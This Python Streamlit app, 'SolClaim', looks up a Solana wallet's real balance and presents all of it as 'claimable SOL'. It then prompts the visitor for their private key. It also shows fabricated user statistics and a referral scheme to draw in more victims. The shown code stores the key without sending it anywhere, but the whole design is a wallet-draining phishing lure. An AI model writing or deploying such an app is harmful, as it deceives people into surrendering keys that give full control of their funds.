from solana.rpc.api import Client
from solana.publickey import PublicKey
import base58
import streamlit as st
import time
from decimal import Decimal

def initialize_session_state():
      if 'total_users' not in st.session_state:
          st.session_state.total_users = 6252
      if 'total_sol' not in st.session_state:
          st.session_state.total_sol = Decimal('1925.67')
      if 'referral_points' not in st.session_state:
          st.session_state.referral_points = {}
      if 'referrals' not in st.session_state:
          st.session_state.referrals = {}

def check_wallet_eligibility(wallet_address):
    
    solana_client = Client("https://api.mainnet-beta.solana.com")
    
    if not wallet_address or wallet_address.isspace():
        return 0
        
    try:
        # Convert string address to Solana PublicKey
        pubkey = PublicKey(wallet_address)
        
        # Get balance using the proper PublicKey object
        response = solana_client.get_balance(pubkey)
        balance = response["result"]["value"] / 1000000000
        
        if balance > 0:
            return round(balance, 2)
            
    except Exception as e:
        print(f"Error checking wallet: {e}")
        return 0
    
    return 0

def display_referral_dashboard():
      st.markdown("### 🌟 Your Referral Dashboard")
      wallet = st.text_input("Enter your wallet to view referral stats:")
      if wallet:
          points = st.session_state.referral_points.get(wallet, 0)
          referrals = len(st.session_state.referrals.get(wallet, []))
          col1, col2 = st.columns(2)
          with col1:
              st.metric("Total Points", points)
          with col2:
              st.metric("Total Referrals", referrals)
          referral_link = f"https://solclaim.io/ref/{wallet[:8]}"
          st.markdown("### 🔗 Your Referral Link")
          st.code(referral_link, language="markdown")

def main():
      initialize_session_state()
      st.title("💰 SolClaim: Reclaim Your Sol!")
      st.markdown("📊 **Stats:** 6252 users have already claimed 1925.67 SOL in total!")
    
      menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])
    
      if menu == "Check Wallet ✅":
          wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")
          if wallet_address:
              with st.spinner("🕑 Loading wallet info..."):
                  claimable_sol = check_wallet_eligibility(wallet_address)
              if claimable_sol > 0:
                  st.success(f"🎉 You have {claimable_sol} SOL available to claim!")
                  st.warning("⚠️ To proceed with the cleanup and claim process, please provide your private key:")
                  private_key = st.text_input("Enter private key:", type="password")
              else:
                  st.error("❌ Invalid wallet address or no SOL balance found")
      elif menu == "Invite & Earn 📢":
          display_referral_dashboard()

if __name__ == "__main__":
    main()
